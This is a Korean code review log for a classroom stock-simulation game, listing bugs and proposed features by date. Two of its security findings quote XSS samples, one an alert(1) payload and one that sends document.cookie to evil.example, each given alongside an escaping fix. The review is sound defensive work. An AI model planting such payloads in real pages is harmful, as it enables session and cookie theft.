- **`enterHostGame()` 에서 퀴즈 설정 미로드** (`app.js:258-274`): `enterHostGame()`은 `loadRltConfig()`를 호출해 룰렛 설정을 복원하지만 `GET /api/rooms/<rid>/host/quiz-settings`(`app.py:1399`)에 대응하는 `loadQuizSettings()` 호출은 없음. 호스트가 새로고침 또는 재접속하면 이전에 저장한 퀴즈 문제·보기가 기본값으로 초기화되어 표시됨. `loadRltConfig()` 패턴과 동일하게 `loadQuizSettings()` 함수를 추가하고 `enterHostGame()` 초기화 시퀀스에 포함시키면 됨.

- **진행자 로비 화면 뒤로가기/취소 버튼 없음** (`index.html:81`): `screen-host-lobby`의 상단 좌측 `<span></span>`이 비어 있어 진행자가 방을 잘못 만들었을 때 취소 방법이 없음. 참가자 화면의 "← 나가기" 패턴과 동일하게 방 코드를 무효화(`DELETE /api/rooms/<rid>`) 또는 단순히 랜딩 화면으로 복귀하는 버튼을 추가해야 함. 단, 참가자가 이미 입장한 경우에는 경고 확인 다이얼로그를 표시하도록 구현해야 함.

- **종목 그리드 정렬 옵션 없음** (`app.js:1257-1270`): `renderGrid()`는 서버에서 반환된 순서(`STOCKS` 딕셔너리 선언 순서)를 그대로 표시함. 변동률 높은 종목·낮은 종목·가격순·섹터별 정렬이 없어 학생이 수동으로 스캔해야 함. 헤더 영역에 정렬 드롭다운(`변동률 ↑↓ / 가격 ↑↓ / 이름순`)을 추가하고 `S.stocks` 배열을 `sort()` 후 `renderGrid()`를 재호출하는 방식으로 서버 변경 없이 구현 가능.

- **참가자가 일시정지 상태인 방에 입장 시 paused 배너 최대 10초 지연** (`app.js:589-651`): `enterParticipantGame()` 함수가 반환된 직후 `S.room.status === 'paused'`를 확인해 `showPausedBanner()`를 즉시 호출하는 코드가 없음. 일시정지 중인 방에 늦게 입장한 학생에게 첫 폴링 사이클(최대 10초)이 완료될 때까지 배너가 보이지 않음. `enterParticipantGame()` 마지막에 `if (S.room.status === 'paused') showPausedBanner();` 한 줄 추가로 해결됨.

### 제거/단순화할 것들

- **`host_force_price()` 0% 입력 검증 누락** (`app.py:682`): `host_market_event()`(`app.py:1355`)는 `if pct == 0: return error` 체크가 있지만, `host_force_price()`의 `abs(pct) > 50` 체크는 `pct == 0`을 통과시킴. 0%로 가격을 강제 설정하면 `force_price()`가 현재가 × 1.0을 저장해 변화는 없지만 불필요한 뉴스 항목이 생성되고 DB 쓰기가 발생함. `if pct == 0: return jsonify({'error': '0%는 입력할 수 없습니다'}), 400` 을 `abs(pct) > 50` 검사 앞에 추가해야 함.

- **`host_adjust()` delta=0 허용으로 빈 트랜잭션 생성** (`app.py:596-603`): `delta = float(d.get('delta', 0))` 이후 0 검증 없이 `amount = delta`, `RoomTransaction(..., amount=0)` 이 기록됨. 0원 조정은 현금도 변하지 않고 거래 내역에 혼란만 유발함. `if delta == 0: return jsonify({'error': '조정 금액을 입력하세요'}), 400` 을 추가해 의미 없는 트랜잭션 생성을 막아야 함.

- **`Apple` 종목 심볼 오타 `APPL` → `AAPL`** (`stock_service.py:78`): `STOCKS` 딕셔너리에서 Apple의 키가 `'APPL'`로 선언되어 있음. 실제 나스닥 티커는 `AAPL`이며, 학생들이 실제 증시와 비교 학습 시 혼란을 유발함. 단순 키 이름 변경이지만 이미 저장된 `RoomHolding.symbol` 값과 불일치가 생길 수 있으므로, DB 마이그레이션(`UPDATE room_holdings SET symbol='AAPL' WHERE symbol='APPL'`) 또는 `STOCKS`에 `'APPL'` 별칭 유지 후 신규 방부터만 `AAPL` 사용하는 방법 중 선택해야 함.

- **`setDepPct()` 소액 현금 시 전 버튼 0원 반환** (`app.js:1596-1601`): `Math.floor(cash * pct / 100 / 10000) * 10000` 계산으로 현금이 10,000원 미만이면 25%·50%·75%·100% 모두 0을 반환함. 입금 버튼을 눌러도 아무 일도 없어 학생이 버튼이 고장난 것으로 오해함. `Math.max(1, Math.round(cash * pct / 100))` 으로 교체하거나, 가용 현금이 10,000원 미만일 때 버튼에 "잔액 부족" 툴팁을 노출하는 방식으로 UX를 개선해야 함.

- **서버 재시작 시 복권 `active` 상태 유실로 방 고착 가능** (`app.py:165-166`, `app.py:409-430`): `_lots` 딕셔너리가 in-memory에만 존재해 서버 재시작(Render 슬립→웨이크업 포함) 시 초기화됨. 복권 진행 중 서버가 재시작되면 `_lots` 키가 없어 `GET /api/rooms/<rid>/lottery` 가 빈 응답을 반환하고, 참가자 화면은 폴링으로 `status: null`을 받아 복권 오버레이가 닫히지 않는 상태가 될 수 있음. 단기 해결책으로 `Room.lottery_rounds_done` 필드처럼 `_lots` 상태를 DB 컬럼(`Room.lottery_state TEXT`)에 JSON 직렬화해 재시작 후 복원하거나, 서버 재시작 감지 시 진행 중 복권을 자동 종료(skip)하는 로직을 추가해야 함.

---

## 2026-06-26 (2차)

### 추가하면 좋을 기능

- **API 401 응답 전역 처리 없어 세션 만료 시 화면 고착** (`app.js:29-45`): `api.get/post` 함수가 HTTP 401을 받으면 `{error: 'HTTP 401'}`을 반환하지만 이를 전역에서 처리해 랜딩 페이지로 복귀하는 코드가 없음. 서버 재시작·쿠키 삭제 등으로 세션이 만료되면 10초 폴링이 계속 401을 받으면서도 학생 화면은 게임 중 상태로 고착되고 오류 메시지 없이 데이터만 사라짐. `api.get/post` 안에 `if (r.status === 401) { showLanding(); toast('세션이 만료되었습니다. 다시 입장해주세요.', 'warn'); return {error: 'session'}; }` 처리를 추가하면 5줄로 해결 가능하며, 서버 재시작이 잦은 Render 무료 티어 환경에서 특히 중요.

- **보유 종목 주식 차트 모달에 매수 평균가 수평선 미표시** (`app.js:1344-1398`): `openStockModal()`에서 포트폴리오 API를 호출해 `S.tradeHolding`과 `avg_price`를 이미 알고 있지만, `loadChart()`가 생성하는 Chart.js 라인 차트에 매수 평균가 수평선이 없어 학생이 차트 상에서 수익/손실 여부를 바로 파악하기 어려움. `datasets`에 `{data: Array(labels.length).fill(port.avg_price), borderColor: '#e3b341', borderDash: [4,4], pointRadius: 0, label: '평균매수가'}` 두 번째 데이터셋을 추가하면 서버 변경 없이 Chart.js 기본 기능만으로 구현 가능. 주식을 보유하지 않은 경우에는 데이터셋을 추가하지 않도록 분기 처리.

- **`doJoinRoom()` `is_host` 체크 없어 진행자가 자신의 방에 학생으로 오입장** (`app.js:143-169`): 진행자가 실수로 자신의 방 코드를 '방 참가' 경로로 입력하면 서버는 `is_host: true`인 `room_dict`를 반환하지만, `doJoinRoom()` 내 `if (S.room.status === 'active') { enterParticipantGame(); }` 분기가 `is_host` 체크 없이 학생 화면으로 진입시킴. 진행자가 학생 화면에 갇혀 순위 조정·강제 시세·게임 종료 등 모든 호스트 기능을 잃음. `doJoinRoom()` 반환 직전 `if (S.room.is_host) { resumeRoom(); return; }` 두 줄만 추가하면 올바른 진행자 화면으로 리디렉트됨.

- **`doEndGame()` confirm 다이얼로그 누락** (`app.js:540-552`): `doStartGame()` (`app.js:247`)에는 `if (!confirm('게임을 시작하시겠습니까?')) return;` 가드가 있지만, `doEndGame()`은 confirm 없이 즉시 API를 호출함. 진행자가 실수로 종료 버튼을 클릭하면 1분 카운트다운이 바로 시작되고 취소할 수 없음. `doEndGame()` 첫 줄에 `if (!confirm('게임을 종료하시겠습니까? 1분 카운트다운이 시작됩니다.')) return;` 한 줄 추가 권장.

- **게임 종료 후 진행자 화면에 전체 통계 요약 패널 없음** (`app.py:808-824`, `app.py:829-847`): 결과 화면에는 순위표만 있고 "총 거래 건수", "가장 많이 거래된 종목", "전체 평균 수익률", "가장 활발한 학생"과 같은 수업 마무리 통계가 없음. `GET /api/rooms/<rid>/summary` 엔드포인트를 추가해 `RoomTransaction`과 `RoomMember` 테이블 집계 결과 `{total_trades, top_symbol, avg_gain_pct, most_active_username}`를 반환하면 됨. 기존 `export_rankings()` · `get_rankings()` 와 거의 동일한 쿼리 패턴으로 ~40줄 구현 가능하며, 수업 종료 토론에서 즉시 활용 가능.

- **복권 결과 닫기 후 `_lotResultRound` 미갱신으로 동일 회차 재폴링 가능** (`app.js:588-650`): 참가자 폴링 루프에서 `r.lottery_active && !_lotPollInterval && _lotResultRound !== r.lottery_current_round` 조건으로 복권 폴링을 시작함. `_startLotPolling()` 완료 또는 결과 확인 시 `_lotResultRound`가 설정되지만, 오버레이 강제 닫기·네트워크 오류 등으로 `_stopLotPolling()` 없이 오버레이만 닫히면 `_lotResultRound`가 갱신되지 않아 다음 10초 폴링에서 같은 회차에 대한 복권 오버레이가 다시 열릴 수 있음. `closeLotteryOverlay()` 함수 안에서 `_lotResultRound = S.room.lottery_current_round` 를 명시적으로 설정하는 방어 코드를 추가 권장.

---

### 제거/단순화할 것들

- **`loadPortfolio()`·`loadChart()` 매번 Chart.js destroy/recreate** (`app.js:1375`, `app.js:1486`, `app.js:1509`): `S.portChart.destroy()`, `S.assetLineChart.destroy()`, `S.stockChart.destroy()` 가 포트폴리오 탭 진입·주식 모달 열기·기간 탭 전환 시마다 반복됨. `S.hostBarChart` (`app.js:440-447`)는 이미 `.data.labels`, `.data.datasets[0].data` 교체 후 `.update()` 를 호출하는 패턴으로 깜빡임 없이 갱신됨. 세 차트도 동일 패턴으로 교체하면 매번 발생하는 DOM 생성·소멸 비용이 사라지고 차트 전환 시 부드러운 애니메이션을 얻을 수 있음.

- **`showBombNews()` innerHTML에 서버 헤드라인 직접 삽입** (`app.js:1157-1163`): `content.innerHTML = items.map(item => ... item.headline ...).join('')` 로 서버에서 온 뉴스 헤드라인을 sanitize 없이 innerHTML에 삽입함. 현재는 서버 생성 템플릿이라 안전하지만, 향후 진행자 커스텀 뉴스 입력 기능이 추가되면 XSS 취약점이 됨. `escHtml()` 함수가 `app.js:897-899`에 이미 정의되어 있으므로 `item.headline` → `escHtml(item.headline)` 교체 3곳으로 방어 가능하며 선제적으로 적용하는 것이 바람직함.

- **`withdraw_deposit()` RoomMember None 체크 없음** (`app.py:910-915`): `m = RoomMember.query.filter_by(room_id=rid, user_id=user.id).first()` 이후 None 여부를 확인하지 않고 `m.cash += dep.amount`를 실행함. 해당 사용자가 방 멤버가 아닌 상황(데이터 불일치, 게임 강제 종료 후 잔여 예금 등)에서 `DELETE /api/rooms/<rid>/deposits/<did>` 요청이 오면 `AttributeError` → HTTP 500 발생. `app.py:912` 직후에 `if not m: return jsonify({'error': '참여자 정보를 찾을 수 없습니다.'}), 404` 가드 한 줄 추가로 해결됨.

- **`create_deposit()` amount 상한값이 사실상 무한대** (`app.py:887-890`): `if not (0 < amount < float('inf'))` 검증의 상한이 사실상 무한대이므로 `amount = 9e300` 같은 극단적 float이 통과해 `m.cash -= amount` 로 현금이 -9e300이 될 수 있음. `m.cash < amount` 체크가 바로 뒤에 있어(`app.py:890`) 실제로는 차단되지만, float 정밀도 경계값에서 의도치 않은 동작이 가능. 검증을 `if not (1 <= amount <= m.cash)` 하나로 통합하거나 `if amount > room.starting_cash * 10: return jsonify({'error': '금액이 너무 큽니다'}), 400` 절대 상한을 추가해 명시적 상한을 두는 것이 안전.

- **`_lot_round_due()` Lock 없이 공유 `_lots` 딕셔너리 접근** (`app.py:181`): `_lot_round_due()` 내 `lot = _lots.get(rid)`, `cur = lot.get('current')`, `cur.get('state')` 가 `_lottery_lock` 없이 실행됨. `get_lottery()` (`app.py:1123`)는 `with _lottery_lock:` 블록 안에서 상태 전이를 처리하지만, `room_dict()` → `_lot_round_due()` 호출 경로는 Lock을 보유하지 않음. 다른 스레드가 Lock 안에서 `lot['current']`를 새 dict로 교체하는 동안 `cur` 변수가 stale 객체를 참조하는 TOCTOU 경합 가능. `_lot_round_due()` 내부에서 `with _lottery_lock:` 블록으로 `_lots` 조회를 보호하거나, Lock 없이 안전한 `lot.get('current', {}).get('state')` 패턴으로 교체 권장.

- **`loadStudentTxn()` 전역 `S.studentTxnUid`에 의존해 모달 연속 열기 시 경합 가능** (`app.js:503-538`): `openStudentTxn(uid)` 이 전역 `S.studentTxnUid = uid`를 설정한 뒤 `loadStudentTxn(true)` 를 호출함. 진행자가 학생 A 클릭 직후 학생 B를 연속 클릭하면 `S.studentTxnUid`가 B로 덮어써져, A의 API 응답이 나중에 도착해도 B의 거래 내역 모달에 A의 내역이 표시되는 경합 발생 가능. `loadStudentTxn()` 호출 시 `uid`를 클로저 변수로 캡처하고, API 응답 수신 시 `if (uid !== S.studentTxnUid) return;` 가드를 추가하면 경합을 방어할 수 있음.


---

## 2026-06-27

### 추가하면 좋을 기능

- **`confirmLeaveGame()` → `goHome()` 가 로그아웃 실행 — "나가기" 버튼이 세션을 완전 삭제** (`app.js:108-118`, `app.js:114`): `goHome()` 내부에서 `api.post('/api/auth/logout')`을 호출해 Flask 세션 쿠키를 삭제함. 참가자가 "나가기"를 실수로 탭하면 재입장 시 학번+이름을 처음부터 다시 입력해야 하며, 수업 중 30명이 동시에 혼란에 빠질 수 있는 고위험 UX. 최소 수정안: `confirmLeaveGame()` (app.js:114)의 `confirm()` 메시지에 "로그아웃됩니다" 문구를 추가해 의도적 행동임을 명시. 권장 수정안: `goHome()` 에서 로그아웃 API 호출을 제거하고 `S.user`·`S.room`만 초기화하거나, 확인 팝업에 "게임만 나가기(세션 유지)" / "완전 로그아웃" 두 옵션을 구분해 제공.

- **룰렛 자동닫힘 타이머가 스핀 애니메이션 도중에도 계속 카운트다운 — 결과 미표시 가능** (`app.js:975-997`, `app.js:1062-1097`): `doRouletteSpin()` 은 `await new Promise(r => setTimeout(r, 4300))`으로 4.3초 애니메이션을 대기하는데, `_startRltAutoClose()` 의 60초 카운트다운은 그 동안 멈추지 않음. 마지막 스핀을 60초 종료 4초 전에 눌렀다면 `closeRoulette()`가 애니메이션 도중 호출되어 오버레이가 사라짐. 서버에서는 스핀 결과가 정상 처리되어 현금이 변동되지만 학생은 결과를 전혀 볼 수 없음. 수정: `doRouletteSpin()` 진입 시 `_stopRltAutoClose()`로 타이머를 중단하고 결과 표시 완료 후 재시작하거나, `_rltSpinning === true` 이면 auto-close를 3~5초 연장하는 방어 로직 추가.

- **참가자 강퇴 기능이 `waiting` 상태에서만 동작 — 게임 중 잘못 입장한 학생 제거 불가** (`app.py:564-575`): `kick_member()` 의 `if room.status != 'waiting': return 400` 체크로 인해 게임 진행 중 뒤늦게 합류한 학생을 진행자가 제거할 수 없음. 최소 구현: `active/paused` 상태에서는 `RoomMember.cash = 0` 처리 후 `db.session.delete(m)` 을 수행하는 분기를 추가. 대안: `RoomMember` 모델에 `is_kicked = db.Column(db.Boolean, default=False)` 컬럼을 추가해 trade/portfolio API에서 강퇴 플래그를 확인해 거래를 차단하는 소프트-강퇴 방식.

- **예금 건수 제한 없어 소액 다중 예금 시 순위 계산 N+1 부하 가능** (`app.py:107-118`, `app.py:878-902`): `create_deposit()`에 건당 최소 금액이나 최대 건수 제한이 없어 학생이 1원짜리 예금을 수백 건 생성할 수 있음. `member_total_value()` 는 `Deposit.query.filter_by(room_id=rid, user_id=uid, status='active').all()`로 전 건을 조회하므로 30명×100건 = 3000행을 매 랭킹 조회마다 읽게 됨. `create_deposit()` 상단에 `active_count = Deposit.query.filter_by(room_id=rid, user_id=user.id, status='active').count(); if active_count >= 5: return jsonify({'error': '예금은 최대 5건까지 가능합니다.'}), 400` 한 줄 추가로 해결 권장.

---

### 제거/단순화할 것들

- **`loadLobbyMembers()` 에서 username HTML 이스케이프 누락 — XSS 취약점** (`app.js:224-231`): `lobby-members-list` 에 멤버를 렌더링할 때 `` `${m.username}` `` 을 템플릿 리터럴에 직접 삽입. `enter()` 엔드포인트(app.py:331-342)는 username 길이만 검증하고 HTML을 이스케이프하지 않으므로, 학생이 `<img src=x onerror="alert(1)">` 같은 문자열을 이름으로 입력하면 진행자·다른 참가자 화면에서 스크립트가 실행됨. `escHtml()` 함수가 `app.js:897-899` 에 이미 정의되어 있으므로 `m.username` → `escHtml(m.username)` 교체를 `loadLobbyMembers()`, `loadPLobbyMembers()` (app.js:582), `loadHostMembers()` (app.js:413-428) 등 username 을 innerHTML 에 넣는 모든 위치에 적용 필요.

- **`dep-amount` 입력에 `step` 속성 없어 소수점 원 입력 가능** (`index.html:424`, `app.py:887-888`): `<input id="dep-amount" type="number">` 에 `step` 속성이 없어 학생이 `1234567.89` 같은 값을 입력할 수 있음. 서버 `create_deposit()` 에서 `amount = float(...)` 후 별도 반올림 없이 `Deposit(amount=amount)` 로 저장됨. `index.html:424` 에 `step="10000" min="10000"` 을 추가하고, `app.py:888` 에서 `amount = int(amount // 10000) * 10000` 으로 만 원 단위를 서버에서도 강제하면 프론트·백 양쪽에서 일관성 확보.

- **`_lot_round_due()` 동일 요청에서 이중 호출** (`app.py:300`, `app.py:409-430`, `app.py:470-473`): `GET /api/rooms/<rid>` 처리 시 `_auto_start_lottery_if_due(room)` (line 470) 과 `_get_room_cached()` → `room_dict()` → `_lot_round_due()` (line 300) 가 순서대로 각각 호출됨. `_lot_round_due()` 는 `_lots[rid]` 초기화·상태 조회·percentage 계산을 포함하므로 불필요한 중복 실행. `_auto_start_lottery_if_due()` 에서 계산 결과를 반환하고 `room_dict()` 가 이를 재사용하도록 리팩터링하거나, `_lot_round_due()` 를 경량화해 중복 호출 비용을 최소화할 것.

- **`closeLotteryOverlay()` 가 paused-banner 를 실제 게임 상태와 무관하게 무조건 삭제** (`app.js:2277-2281`): 마지막 줄 `document.getElementById('paused-banner')?.remove()` 가 게임이 여전히 `paused` 상태인 경우에도 배너를 제거함. 복권 결과를 확인하고 닫은 뒤 진행자가 별도로 일시정지한 게임에서 참가자가 "거래 가능" 상태로 착각할 수 있음. `if (S.room?.status !== 'paused') document.getElementById('paused-banner')?.remove();` 로 조건부 삭제하거나, 오버레이 닫기 후 룸 상태를 재확인해 배너 표시 여부를 결정하도록 개선 필요.

---

## 2026-06-27 (2차)

### 추가하면 좋을 기능

- **진행자 게임 중 공지사항 브로드캐스트** (`app.py:new endpoint POST /api/rooms/<rid>/host/announce`, `app.js:new overlay`): 진행자가 "30분 후 세금 이벤트 예정!", "금 섹터 집중 주목!" 같은 자유 텍스트 공지를 게임 중 실시간으로 전송하면 모든 참가자 화면에 10초짜리 전체화면 팝업 배너로 표시하는 기능. 현재 폭탄뉴스(`showBombNews()`, `app.js:1148`)는 자동 생성 헤드라인만 표시하지만, 공지사항은 진행자가 직접 입력한 메시지를 전달. 서버 측에는 `_announcements = {rid: {text: str, ts: float}}` 인메모리 딕셔너리를 추가하고 `GET /api/rooms/<rid>/news` 응답에 `announcement` 필드를 포함시키는 방식으로 8초 폴링 인프라를 재활용하면 신규 엔드포인트 1개 + JS 20줄 미만으로 구현 가능.

- **진행자 사전 이벤트 스케줄러** (`app.py:new endpoint POST /api/rooms/<rid>/host/schedule-event`, `models.py:Room`): 진행자가 게임 시작 전 "게임 40% 경과 시 반도체 섹터 -15%", "종료 10분 전 전체 시장 +8%" 등 이벤트를 미리 등록해 두면 `room_dict()` 내 `_lot_round_due()` 패턴과 동일하게 타이밍 도달 시 자동으로 `force_sector_event()`를 트리거하는 기능. 이벤트 목록을 `Room` 모델에 `scheduled_events TEXT` (JSON 직렬화) 컬럼으로 영속화하고 `get_room()` (`app.py:432`) 의 자동 종료 체크 블록 직후 스케줄 체크 루프를 추가하면 됨. 수업 시나리오를 미리 준비한 교사가 게임 중 화면에서 눈을 뗄 필요 없이 준비된 이벤트가 자동 실행되어 수업 몰입도를 높임.

- **학생 현금 안전금고(자기 보호 하한)** (`app.js:execTrade()`, `app.js:doRouletteSpin()`): 학생이 "잔액의 최소 20%는 절대 쓰지 않겠다"는 하한을 설정하면 `execTrade()` 와 `doRouletteSpin()` 이 해당 금액 이하로의 거래를 클라이언트 측에서 차단하고 경고를 표시하는 기능. `localStorage.setItem('safetyFloor-' + S.room.id, amount)` 로 저장하고 포트폴리오 탭에 설정 UI를 추가하면 서버 변경 없이 순수 JS로 구현 가능. 충동적 투자 억제·손실 관리 교육과 연계 가능하며, "내 안전금고는 얼마였나요?" 수업 후 토론 소재로 활용될 수 있음.

- **방 설정 자동 저장 (localStorage 자동 채움)** (`app.js:doCreateRoom()`, `index.html:51-65`): 진행자가 방을 만들 때 설정한 게임 시간·시작 자금·예금 금리를 `doCreateRoom()` 성공 시 `localStorage.setItem('lastRoomCfg', JSON.stringify({dur, cash, rate}))` 로 저장하고, 다음 방 만들기 화면(`screen-host-create`) 진입 시 `lastRoomCfg` 를 읽어 폼 필드를 자동 채우는 기능. 매 수업마다 동일한 값을 재입력하는 불편을 없애며 서버 변경 없이 10줄 미만으로 구현 가능. `doCreateRoom()` 반환 시와 방 만들기 화면 진입 이벤트(`enterHostLobby()` 진입 전 showScreen 호출부)에 각각 1~2줄 추가하면 완성됨.

- **학생 개인 거래내역 CSV 다운로드** (`app.py:new endpoint GET /api/rooms/<rid>/transactions/export`): 현재 엑셀 내보내기(`app.py:1419`)는 호스트 전용이며 최종 순위만 포함됨. 참가자 본인의 전체 거래 내역(매수/매도/보상/룰렛)을 CSV 형식으로 다운로드하는 엔드포인트를 추가하면, 학생이 게임 종료 후 자신의 거래 전략을 직접 분석하는 수업 활동이 가능해짐. `RoomTransaction.query.filter_by(room_id=rid, user_id=user.id)` 결과를 파이썬 표준 라이브러리 `csv.DictWriter` 로 스트리밍하면 `openpyxl` 없이 경량 구현 가능 (`app.py:1417` 참조). 헤더는 `날짜, 종목, 유형, 수량, 가격, 금액, 메모` 로 한글화.

- **진행자 시장 탭에서 종목 차트 바로 조회** (`app.js:314-358`, `app.js:1327-1357`): 진행자 시장 탭(`loadHostMarket()`) 의 종목 카드는 현재 가격·변동률만 표시하고 클릭해도 아무 반응이 없음. 강제 시세 변경 전 추세를 파악하려면 진행자가 별도로 학생 화면을 열어야 함. `renderGrid()` 와 달리 `loadHostMarket()` 의 카드 생성 템플릿(`app.js:343-358`)에 `onclick="openStockModal('${st.symbol}')"` 을 추가하면 기존 `openStockModal()` 함수(`app.js:1327`)를 재사용해 차트 모달을 바로 열 수 있음. 단, 진행자 화면에서는 매수/매도 버튼을 숨기거나 비활성화(`S.room.is_host` 체크)해야 하며, 이미 `host_members_transactions` 모달에 같은 패턴이 있어 5줄 이내 수정으로 구현 가능.

---

### 제거/단순화할 것들

- **`trade()` 잔액 검사-커밋 간 TOCTOU — 동시 매수 시 음수 현금 가능** (`app.py:748-765`): `if member.cash < amount: return ...` 체크와 `db.session.commit()` 사이에 DB 수준 잠금이 없어, 동일 학생이 두 탭에서 거의 동시에 매수 요청을 보내면 두 요청 모두 "잔액 충분" 판정을 통과한 뒤 각각 커밋돼 현금이 음수가 될 수 있음. 예: 잔액 600만 원에서 400만 원짜리 주식 두 건 동시 매수 → 최종 현금 -200만 원. 근본 해결책: `member.cash = RoomMember.cash - amount` 대신 SQLAlchemy `UPDATE room_members SET cash = cash - :amount WHERE id = :id AND cash >= :amount` 원자적 감소 + `rowcount == 0` 시 잔액 부족 에러 반환. 단기 해결책: 트랜잭션 내 `db.session.refresh(member)` + 재검증 후 커밋 패턴으로 스테일 읽기 방지 (`app.py:748` 직전).

- **`host_market_event()` 뉴스 캐시 미무효화** (`app.py:1357-1360`): `force_sector_event()` 내부에서 `self._news` 와 `self._last_news_ts` 를 갱신하지만, `_news_cache` (`app.py:67`) 딕셔너리는 무효화되지 않아 섹터 이벤트 직후 최대 2초 동안 참가자가 이전 뉴스를 받음. `host_force_price()` 의 동일 문제는 2026-06-23 (2차) 항목에 기록됐으나 `host_market_event()` 는 포함되지 않았음. `return jsonify(...)` 직전(`app.py:1360`)에 `_invalidate_news_cache(rid)` 한 줄 추가로 해결되며, 섹터 이벤트와 연계 뉴스가 즉시 클라이언트에 반영됨.

- **`loadStudentTxn()` `t.note` HTML 미이스케이프 — 진행자 입력 Stored XSS** (`app.js:530-531`, `app.py:596`): `host_adjust()` 의 `note = d.get('note', '진행자 자산 조정')` 는 사용자 입력을 그대로 DB(`RoomTransaction.note`)에 저장하고, `host_member_transactions()` 와 `get_transactions()` 가 이를 반환하면 `loadStudentTxn()` 의 `` `${t.note ? ' · ' + t.note : ''}` `` 이 `innerHTML` 에 이스케이프 없이 삽입됨. 진행자가 조정 메모 입력란(`adj-note`)에 `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">` 를 입력하면 거래 내역 모달을 여는 진행자 본인 화면에서 Stored XSS 발생. `app.js:531` 에서 `escHtml(t.note)` 적용 필수 (`escHtml()` 함수는 `app.js:897-899` 에 이미 존재); 서버 측에서도 `app.py:596` 에서 `note = note[:100]` 길이 제한 추가 권장.

- **`get_quiz()` 조회 시 `seen` 에 즉시 추가 — 제출 없이도 문제 소모** (`app.py:1265-1268`): `GET /api/rooms/<rid>/quiz` 응답 시점에 `seen.add(q['id'])` 가 실행됨(`app.py:1266`). 학생이 퀴즈 오버레이를 열었다가 답하지 않고 닫으면 해당 문제는 "조회됨"으로 처리돼 재출제되지 않음. 15개 문제가 있다면 학생이 15번 연속 열고 닫으면 모든 문제를 소모해 이후 출제될 문제가 없어짐. 수정 방법: `seen.add(q['id'])` 를 `submit_quiz()` (`app.py:1341`) 내 정답/오답 처리 블록으로 이동하거나, `GET` 응답에 `pending_qid` 만 저장하고 `POST` 제출 시 확정하는 두 단계 처리로 변경 (`app.py:1267`).

- **`force_sector_event()` 후 `_current_biases` 미갱신 — 섹터 이벤트가 다음 TTL에 역전** (`stock_service.py:244-276`): `force_price()` 의 동일 문제는 2026-06-11 항목에 문서화됐으나 `force_sector_event()` 는 포함되지 않음. 이 함수는 섹터 내 모든 종목 가격을 강제 이동시키지만 `self._current_biases` 를 갱신하지 않아, 다음 `_price_ttl` 사이클(기본 20초)에서 기존 bias 방향으로 가격이 역전될 수 있음. `for sym in affected:` 루프 내 (`stock_service.py:252` 직후)에 `self._current_biases[sym] = 'up' if pct > 0 else 'down'` 한 줄 추가로 섹터 이벤트 모멘텀이 다음 사이클에도 유지됨.

- **`_next_price()` 자연 변동 상한 `base * 1.4` vs. `force_price()` 상한 `base * 3.0` 불일치** (`stock_service.py:139`, `stock_service.py:225`): 자연 가격 변동은 `max(base * 0.6, min(base * 1.4, new_price))` 로 제한되지만, 진행자 강제 조정은 `max(base * 0.3, min(base * 3.0, new_price))` 까지 허용함. 강제로 `base * 2.0` 으로 올린 뒤 다음 TTL에 자연 변동이 발생하면 `_next_price()` 가 `current`(=`base*2.0`)를 기준으로 새 가격을 계산하는 게 아니라 내부적으로 여전히 `base * 1.4` 캡을 적용하므로 강제 조정 효과가 1 TTL(20초) 만에 사라짐. 해결책: `_next_price()` 캡을 현재가 기준 상대 범위(`current * [0.7, 1.3]`)로 변경하거나, `force_price()` 직후 `_price_ttl` 동안 해당 종목의 자연 변동을 스킵하는 `_force_protected: set` 플래그를 추가해야 함 (`stock_service.py:174` 의 `get_price()` 캐시 체크 로직 참조).

---

## 2026-06-28

### 추가하면 좋을 기능

- **게임 진행 중 진행자 강퇴 기능 허용** (`app.py:566-575`): `kick_member()`에서 `room.status != 'waiting'` 조건(app.py:570)으로 게임 시작 후에는 강퇴가 불가. 수업 중 부정행위 학생이나 연결 문제 학생을 즉시 제거하려 해도 방법이 없음. `_end_room()` (app.py:144-153) 내 보유 주식 현금 청산 로직을 `_liquidate_member(rid, uid, svc)` 함수로 분리하고, `kick_member()`에서 게임 진행 중일 때도 해당 함수를 호출한 뒤 `RoomMember` 삭제를 허용하면 구현 가능. 서버 30줄, 클라이언트 0줄 수정.

- **큰 금액 거래 시 확인 다이얼로그** (`app.js:execTrade()` 부근, `index.html:713-716`): 고등학생이 "전량 매수" 버튼이나 수량 입력 실수로 총자산의 50% 이상을 한 번에 거래하는 사고가 잦음. 매수·매도 버튼 핸들러에서 `amount > S.room.starting_cash * 0.5` 조건일 때 `confirm('총자산의 XX%를 한 번에 거래합니다. 계속할까요?')`를 표시하면 실수를 줄일 수 있음. 서버 변경 불필요, JS 5줄 추가.

- **뉴스 클라이언트 폴링 주기를 서버 설정에 동기화** (`app.js:807-819`, `app.py:631-646`): `startNewsPolling()`이 8초 고정 간격으로 `/news`를 요청하지만, 진행자가 `news_seconds`를 60초로 늘려도 클라이언트는 8초마다 동일 캐시를 수신. Render 무료 플랜에서 불필요한 요청 부담. `doSetIntervals()` (app.js:391) 응답 수신 후 `clearInterval(S.newsInterval); S.newsInterval = setInterval(..., Math.max(8000, data.news_seconds * 1000))` 패턴으로 간격을 갱신하면 트래픽 대폭 절감.

- **포트폴리오 도넛 차트에 섹터 집계 토글** (`app.js:portChart` 초기화, `index.html:388-391`): 현재 도넛 차트는 종목별 비중만 표시. 토글 버튼 하나로 종목별 ↔ 섹터별 보기를 전환하면 `STOCKS[sym]['sector']`를 이용해 "반도체 45% / IT 30% / 금융 25%"처럼 렌더링 가능. 분산투자·집중투자 개념을 시각적으로 토론할 수 있는 교육 포인트 제공. 서버 변경 불필요.

- **결과 화면 및 Excel에 학생별 거래 요약(최다 거래 종목·섹터) 추가** (`app.py:1419-1488`, `app.js:loadResults()`): 현재 Excel `최종 순위` 시트는 순위·이름·학번·자산·수익률만 포함. `RoomTransaction` 조회로 종목별 거래 횟수를 집계하고, Excel에 "거래 요약" 시트를 추가(`wb.create_sheet('거래 요약')`)하면 교사의 사후 수업 평가 자료가 풍부해짐. `export_rankings()` (app.py:1419)에 `openpyxl` 시트 추가 20줄로 구현 가능.

---

### 제거/단순화할 것들

